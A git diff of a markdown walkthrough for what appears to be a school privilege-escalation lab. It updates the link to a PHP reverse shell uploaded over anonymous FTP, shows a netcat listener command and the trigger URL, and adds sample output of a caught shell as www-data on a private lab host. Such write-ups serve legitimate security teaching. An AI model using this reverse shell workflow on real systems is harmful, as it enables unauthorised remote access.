@@ -1,5 +1,4 @@
 
-
 # Privilege Escalation Exercise: Detailed Walkthrough
 
 ## Summary
@@ -81,7 +80,7 @@ Use the anonymous username and no password.
 
 2. #### Upload Reverse Shell Script:
 
-- Click [here](https://github.com/YoannLetacq/local/blob/main/reverse.php) to look the reverse shell script.
+- Click [here](https://zone01normandie.org/git/yyoannle/local/src/branch/master/reverse.php) to look the reverse shell script.
 
 - Upload script using FTP:
 ```sh
@@ -98,6 +97,19 @@ nc -lvnp 1234
 On the attacker machine navigate to:
 ```url
 http://172.16.1.255/files/reverse.php
+```
+
+When the connection is set up properly you shoud get something like this:
+```sh
+└─$ nc -lvnp 1234                           
+listening on [any] 1234 ...
+connect to [172.16.2.135] from (UNKNOWN) [172.16.1.255] 60774
+Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:10:29 up 21 min,  0 users,  load average: 0.09, 0.03, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
 ```
 
 ## Privilege Escalation
@@ -233,5 +245,7 @@ By following the steps outlined above, the root flag was successfully retrieved 
 
 
 Made by **Yoann Letacq**
+
+Thanks **Quentin Boiteux** for the usefull tips
 
 
